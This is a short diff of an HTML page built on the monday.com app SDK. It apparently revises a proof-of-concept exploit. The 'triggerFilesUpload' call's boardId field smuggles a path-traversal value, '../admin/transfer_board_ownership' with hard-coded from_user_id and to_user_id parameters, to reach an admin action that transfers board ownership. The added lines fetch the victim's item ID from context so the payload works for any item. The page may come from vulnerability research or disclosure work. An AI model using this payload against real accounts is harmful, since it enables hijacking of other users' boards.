@@ -5,9 +5,15 @@
 <body>
   <script>
     const monday = window.mondaySdk();
+    let itemId;
+    
+    monday.get('context').then(({data}) => {
+      itemId = data.itemId;
+    });
+    
     triggerFilesUpload = () => monday.execute("triggerFilesUpload", {
       boardId: '../admin/transfer_board_ownership?from_user_id=17526220&to_user_id=25463305&a=',
-      itemId: 6708996963,
+      itemId,
       columnId: 'group'
     });
   </script>
